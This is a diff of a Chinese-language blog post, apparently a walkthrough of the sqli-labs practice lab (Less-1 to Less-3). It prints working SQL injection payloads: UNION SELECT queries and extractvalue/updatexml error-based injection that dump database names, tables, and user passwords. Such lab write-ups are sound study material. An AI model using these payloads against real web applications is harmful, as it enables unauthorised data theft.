@@ -5,31 +5,47 @@
   
 
   
-  <title>vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-1 | Hexo</title>
+  <title>vulfocus/sqli-labs  Less1-Less21 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="输入?id&#x3D;1后页面显示登录成功，用户名Dumb密码Dumb     输入?id&#x3D;1’  语法出现报错     输入?id&#x3D;1’ order by 1 –+ 或?id&#x3D;1’ order by 1 #就可以注释掉系统后面的代码页面显示正常，可以判断存在单引号的注入问题。     尝试输入?id&#x3D;1’ and 1&#x3D;2 order by 1 –+?id&#x3D;1’ and 1&#x3D;2 order by 2 –+?">
+  <meta name="description" content="SQLI DUMB SERIES-1输入?id&#x3D;1后页面显示登录成功，用户名Dumb密码Dumb     输入?id&#x3D;1’  语法出现报错     输入?id&#x3D;1’ order by 1 –+ 或?id&#x3D;1’ order by 1 #就可以注释掉系统后面的代码页面显示正常，可以判断存在单引号的注入问题。     尝试输入?id&#x3D;1’ and 1&#x3D;2 order by 1 –+?id&#x3D;1’ and">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vulfocus&#x2F;sqli-labs  Less1  SQLI DUMB SERIES-1">
+<meta property="og:title" content="vulfocus&#x2F;sqli-labs  Less1-Less21">
 <meta property="og:url" content="http://example.com/2022/03/24/SERIES-1/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="输入?id&#x3D;1后页面显示登录成功，用户名Dumb密码Dumb     输入?id&#x3D;1’  语法出现报错     输入?id&#x3D;1’ order by 1 –+ 或?id&#x3D;1’ order by 1 #就可以注释掉系统后面的代码页面显示正常，可以判断存在单引号的注入问题。     尝试输入?id&#x3D;1’ and 1&#x3D;2 order by 1 –+?id&#x3D;1’ and 1&#x3D;2 order by 2 –+?">
+<meta property="og:description" content="SQLI DUMB SERIES-1输入?id&#x3D;1后页面显示登录成功，用户名Dumb密码Dumb     输入?id&#x3D;1’  语法出现报错     输入?id&#x3D;1’ order by 1 –+ 或?id&#x3D;1’ order by 1 #就可以注释掉系统后面的代码页面显示正常，可以判断存在单引号的注入问题。     尝试输入?id&#x3D;1’ and 1&#x3D;2 order by 1 –+?id&#x3D;1’ and">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/1.png">
-<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/2.png">
-<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/3.png">
-<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/4.png">
-<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/5.png">
-<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/6.png">
-<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/7.png">
-<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/8.png">
-<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/9.png">
-<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/10.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/1-1.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/1-2.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/1-3.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/1-4.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/1-5.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/1-6.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/1-7.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/1-8.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/1-9.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/1-10.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/2-1.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/2-2.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/2-3.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/2-4.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/2-5.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/2-6.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/2-7.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/2-8.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/2-9.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/3-1.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/3-2.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/3-3.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/3-4.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/3-5.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/3-6.png">
+<meta property="og:image" content="http://example.com/2022/03/24/SERIES-1/3-7.png">
 <meta property="article:published_time" content="2022-03-24T11:08:12.000Z">
-<meta property="article:modified_time" content="2022-03-24T11:49:32.034Z">
+<meta property="article:modified_time" content="2022-03-31T12:09:59.049Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2022/03/24/SERIES-1/1.png">
+<meta name="twitter:image" content="http://example.com/2022/03/24/SERIES-1/1-1.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -92,7 +108,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-1
+      vulfocus/sqli-labs  Less1-Less21
     </h1>
   
 
@@ -100,53 +116,134 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>输入?id=1后页面显示登录成功，用户名Dumb密码Dumb</p>
-<img src="/2022/03/24/SERIES-1/1.png" class="">
+        <h2 id="SQLI-DUMB-SERIES-1"><a href="#SQLI-DUMB-SERIES-1" class="headerlink" title="SQLI DUMB SERIES-1"></a>SQLI DUMB SERIES-1</h2><p>输入?id=1后页面显示登录成功，用户名Dumb密码Dumb</p>
+<img src="/2022/03/24/SERIES-1/1-1.png" class="">
 
 
 
 <p>输入?id=1’  语法出现报错</p>
-<img src="/2022/03/24/SERIES-1/2.png" class="">
+<img src="/2022/03/24/SERIES-1/1-2.png" class="">
 
 
 
 <p>输入?id=1’ order by 1 –+ 或?id=1’ order by 1 #就可以注释掉系统后面的代码<br>页面显示正常，可以判断存在单引号的注入问题。</p>
-<img src="/2022/03/24/SERIES-1/3.png" class="">
+<img src="/2022/03/24/SERIES-1/1-3.png" class="">
 
 
 
 <p>尝试输入<br>?id=1’ and 1=2 order by 1 –+<br>?id=1’ and 1=2 order by 2 –+<br>?id=1’ and 1=2 order by 3 –+皆无错误</p>
 <p>当字段到4是回显错误，说明有3个字段。</p>
-<img src="/2022/03/24/SERIES-1/4.png" class="">
+<img src="/2022/03/24/SERIES-1/1-4.png" class="">
 
-<img src="/2022/03/24/SERIES-1/5.png" class="">
+<img src="/2022/03/24/SERIES-1/1-5.png" class="">
 
 
 
 <p>输入?id=-1’ union select 1,2,3–+查询数据库的名字<br>注：这里使用-1使union之前的语句查询无结果，则显示的时候就会显示union之后的第二条语句。</p>
-<img src="/2022/03/24/SERIES-1/6.png" class="">
+<img src="/2022/03/24/SERIES-1/1-6.png" class="">
 
 
 
 <p>输入?id=-1’ and 1=2 union select 1,database(),3–+查询数据库</p>
-<img src="/2022/03/24/SERIES-1/7.png" class="">
+<img src="/2022/03/24/SERIES-1/1-7.png" class="">
 
 
 
 <p>输入?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –+</p>
 <p>查询第三个数据库的表名</p>
-<img src="/2022/03/24/SERIES-1/8.png" class="">
+<img src="/2022/03/24/SERIES-1/1-8.png" class="">
 
 
 
 <p>输入?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users” –+</p>
 <p>查询users表内容</p>
-<img src="/2022/03/24/SERIES-1/9.png" class="">
+<img src="/2022/03/24/SERIES-1/1-9.png" class="">
 
 
 
 <p>输入?id=-1’ union select 1,2,concat(id,0x3a,username,0x3a,password) from users –+<br>查询id、用户名、密码</p>
-<img src="/2022/03/24/SERIES-1/10.png" class="">
+<img src="/2022/03/24/SERIES-1/1-10.png" class="">
+
+
+
+<h2 id="SQLI-DUMB-SERIES-2"><a href="#SQLI-DUMB-SERIES-2" class="headerlink" title="SQLI DUMB SERIES-2"></a>SQLI DUMB SERIES-2</h2><p>输入?id=1后页面显示登录成功，用户名Dumb密码Dumb</p>
+<img src="/2022/03/24/SERIES-1/2-1.png" class="">
+
+
+
+<p>输入?id=1’ 出现报错</p>
+<img src="/2022/03/24/SERIES-1/2-2.png" class="">
+
+
+
+<p>输入?id=1 and (extractvalue(‘anything’,’/x/xx’))–+<br>报错注入执行成功</p>
+<img src="/2022/03/24/SERIES-1/2-3.png" class="">
+
+
+
+<p>输入?id=1 and (extractvalue(1,concat(1,(select database()))))<br>报出用户名信息</p>
+<img src="/2022/03/24/SERIES-1/2-4.png" class="">
+
+
+
+<p>updatexml和extractvalue都是基于xml语法<br>输入?id=1 and (updatexml(1,concat(1,(select database())),1))<br>报出用户名信息</p>
+<img src="/2022/03/24/SERIES-1/2-5.png" class="">
+
+
+
+<p>输入?id=1 and (updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1))<br>爆出表名</p>
+<img src="/2022/03/24/SERIES-1/2-6.png" class="">
+
+
+
+<p>输入?id=1 and (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=’emails’)),1))<br>报出emails表中的列名</p>
+<img src="/2022/03/24/SERIES-1/2-7.png" class="">
+
+
+
+<p>输入?id=1 and (updatexml(1,concat(0x7e,(select group_concat(id,0x3a,email_id,0x7e) from emails )),1))<br>报出emails表内容，由于位数限制只能爆出前两个</p>
+<img src="/2022/03/24/SERIES-1/2-8.png" class="">
+
+
+
+<p>添上查询条件where id not in(1)不看id为1的数据<br>输入?id=1 and (updatexml(1,concat(0x3e,(select group_concat(id,0x3a,email_id,0x7e) from emails where id not in(1) )),1))<br>报出id2,3的数据</p>
+<img src="/2022/03/24/SERIES-1/2-9.png" class="">
+
+
+
+<h2 id="SQLI-DUMB-SERIES-3"><a href="#SQLI-DUMB-SERIES-3" class="headerlink" title="SQLI DUMB SERIES-3"></a>SQLI DUMB SERIES-3</h2><p>输入?id=1与之前出现页面一样，输入?id=1’后报错</p>
+<img src="/2022/03/24/SERIES-1/3-1.png" class="">
+
+
+
+<p>输入?id=-1’) union select 1,2,3 –+ </p>
+<img src="/2022/03/24/SERIES-1/3-2.png" class="">
+
+
+
+<p>输入?id=-1’) union select 1,2,database(); –+ </p>
+<p>报出用户名信息</p>
+<img src="/2022/03/24/SERIES-1/3-3.png" class="">
+
+
+
+<p>输入?id=-1’) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’ –+<br>查看security数据库</p>
+<img src="/2022/03/24/SERIES-1/3-4.png" class="">
+
+
+
+<p>输入?id=-1’) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’user’ –+<br>查询数据库的表</p>
+<img src="/2022/03/24/SERIES-1/3-5.png" class="">
+
+
+
+<p>输入?id=-1’) union select 1,2,group_concat(username) from security.users –+<br>查询user表</p>
+<img src="/2022/03/24/SERIES-1/3-6.png" class="">
+
+
+
+<p>输入?id=-1’) union select 1,2,group_concat(password) from security.users –+<br>查询密码</p>
+<img src="/2022/03/24/SERIES-1/3-7.png" class="">
       
     </div>
     <footer class="article-footer">
@@ -232,7 +329,7 @@
           </li>
         
           <li>
-            <a href="/2022/03/24/SERIES-1/">vulfocus/sqli-labs  Less1  SQLI DUMB SERIES-1</a>
+            <a href="/2022/03/24/SERIES-1/">vulfocus/sqli-labs  Less1-Less21</a>
           </li>
         
           <li>
